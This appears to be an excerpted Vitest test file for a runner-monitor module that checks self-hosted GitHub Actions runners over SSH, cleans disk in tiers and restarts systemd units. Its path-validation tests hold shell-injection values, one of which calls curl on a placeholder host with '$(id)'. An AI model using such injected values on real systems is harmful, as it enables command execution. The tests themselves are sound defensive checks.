...
const mockRunnerHosts = vi.hoisted(() => ({ value: [] as Array<{ name?: string; host: string; user?: string; port?: number; identityFile?: string; actionsDir?: string; serviceUnit?: string; workDir?: string; toolDir?: string }> }));
vi.mock("../config.js", () => ({
...
import { run, sshExec, assertSafeRunnerPaths } from "./runner-monitor.js";
...
describe("runner-monitor", () => {
  ...
  it("skips temp cleanup while a job is running", async () => {
    mockRunnerHosts.value = [defaultRunner];
    mockSshResponseSequential([
      // status check → active
      "active (running)",
      // zombie check → worker running (etimes well under 21600, no kill)
      " 12345 300 Runner.Worker",
      // df check → 86%
      "  86%",
      // tier 1: docker prune (temp cleanup skipped — no SSH call for it)
      "",
      // tier 1: docker image prune >24h
      "",
      // tier 1: journal vacuum
    ...
    const tempCalls = mockExecFile.mock.calls.filter((c: unknown[]) => {
      const args = c[1] as string[];
      return args[args.length - 1].includes("_work/_temp");
    });
    expect(tempCalls).toHaveLength(0);
    expect(log.info).toHaveBeenCalledWith(expect.stringContaining("skipping temp-file cleanup"));
  });

  it("reaps only stale temp entries when idle", async () => {
    mockRunnerHosts.value = [defaultRunner];
    mockSshResponseSequential([
      // status check → active
      "active (running)",
      // zombie check → no processes
      "",
      // df check → 86%
      "  86%",
      // tier 1: rm temp
    ...
    const tempCall = mockExecFile.mock.calls.find((c: unknown[]) => {
      const args = c[1] as string[];
      return args[args.length - 1].includes("_work/_temp");
    });
    expect(tempCall).toBeDefined();
    const command = (tempCall![1] as string[]).slice(-1)[0];
    expect(command).toContain("-mmin +360");
    expect(command).toContain("-mindepth 1 -maxdepth 1");
    expect(command).not.toContain("rm -rf /tmp/_github_* ");
  });
  ...
  it("skips tool-cache cleanup (tier 2) while a job is running", async () => {
    mockRunnerHosts.value = [defaultRunner];
    mockSshResponseSequential([
      // status check → active
      "active (running)",
      ...
      // df check → 95%
      "  95%",
      // tier 1: docker prune (temp cleanup skipped)
      "",
      // tier 1: docker image prune >24h
      "",
      // tier 1: journal vacuum
      "",
      // tier 2: docker prune -af --volumes (tool cache cleanup skipped)
      "",
      // post-cleanup df
      "  90%",
    ]);
    ...
    const toolCalls = mockExecFile.mock.calls.filter((c: unknown[]) => {
      const args = c[1] as string[];
      return args[args.length - 1].includes("_work/_tool");
    });
    expect(toolCalls).toHaveLength(0);
    expect(log.info).toHaveBeenCalledWith(expect.stringContaining("skipping tool-cache cleanup"));
  });
  ...
  describe("assertSafeRunnerPaths", () => {
    it("does not throw for a safe actionsDir", () => {
      expect(() => assertSafeRunnerPaths({ ...defaultRunner, actionsDir: "/home/actions/actions-runner" })).not.toThrow();
    });

    it("throws for an unsafe actionsDir with shell metacharacters", () => {
      expect(() => assertSafeRunnerPaths({ ...defaultRunner, actionsDir: "/home/actions; curl http://x/$(id)" })).toThrow(/unsafe actionsDir/);
    });
  });

  describe("systemd flavour", () => {
    const systemdRunner = {
    ...
    it("logs healthy when systemd unit is active and no issues", async () => {
      mockRunnerHosts.value = [systemdRunner];
      mockSshResponse({
        [`systemctl is-active github-runner-beefy-actions || true`]: "active\n",
        [`ps -eo pid,etimes,comm | grep -E 'Runner\\.(Worker|Listener)' || true`]: "",
        [`df --output=pcent / | tail -1`]: "  42%",
      });
      ...
      expect(log.info).toHaveBeenCalledWith("[runner-monitor] hetzner-beefy-actions healthy");
      expect(mockNotify).not.toHaveBeenCalled();
    });

    it("restarts dead systemd unit and notifies Slack", async () => {
      mockRunnerHosts.value = [systemdRunner];
      mockSshResponseSequential([
      ...
      expect(mockNotify).toHaveBeenCalledWith(expect.stringContaining("restarted service on hetzner-beefy-actions"));
      const restartCall = mockExecFile.mock.calls.find((c: unknown[]) => {
        const args = c[1] as string[];
        return args[args.length - 1] === "sudo systemctl restart github-runner-beefy-actions";
      });
      expect(restartCall).toBeDefined();
    });

    it("tier-1 temp cleanup targets the workDir path, not actionsDir", async () => {
      mockRunnerHosts.value = [systemdRunner];
      mockSshResponseSequential([
        // status check → active
        "active",
      ...
      const tempCall = mockExecFile.mock.calls.find((c: unknown[]) => {
        const args = c[1] as string[];
        return args[args.length - 1].includes("_temp");
      });
      expect(tempCall).toBeDefined();
      const command = (tempCall![1] as string[]).slice(-1)[0];
      expect(command).toContain("/var/lib/github-runner-beefy-actions-work/_temp");
      expect(command).toContain("-mmin +360");
      expect(command).not.toContain("actions-runner/_work");
    });

    it("tier-2 tool cleanup targets toolDir directly, not workDir/_tool", async () => {
      mockRunnerHosts.value = [systemdRunner];
      mockSshResponseSequential([
        // status check → active
        "active",
      ...
      const toolCall = mockExecFile.mock.calls.find((c: unknown[]) => {
        const args = c[1] as string[];
        return args[args.length - 1] === "sudo rm -rf /var/lib/github-runner-beefy-actions-tool/*";
      });
      expect(toolCall).toBeDefined();
    });

    it("live-worker guard still holds for systemd runners", async () => {
      mockRunnerHosts.value = [systemdRunner];
      mockSshResponseSequential([
        // status check → active
        "active",
      ...
      const skippedCalls = mockExecFile.mock.calls.filter((c: unknown[]) => {
        const args = c[1] as string[];
        const command = args[args.length - 1];
        return command.includes("_temp") || command.includes("-tool/");
      });
    ...
    describe("assertSafeRunnerPaths validation", () => {
      it("rejects an unsafe serviceUnit", () => {
        expect(() => assertSafeRunnerPaths({ ...systemdRunner, serviceUnit: "github-runner; id" })).toThrow(/unsafe serviceUnit/);
      });

      it("rejects an unsafe workDir", () => {
        expect(() => assertSafeRunnerPaths({ ...systemdRunner, workDir: "/var/lib; id" })).toThrow(/unsafe workDir/);
      });

      it("accepts the valid systemd fixture", () => {
        expect(() => assertSafeRunnerPaths(systemdRunner)).not.toThrow();
      });
    });
  });
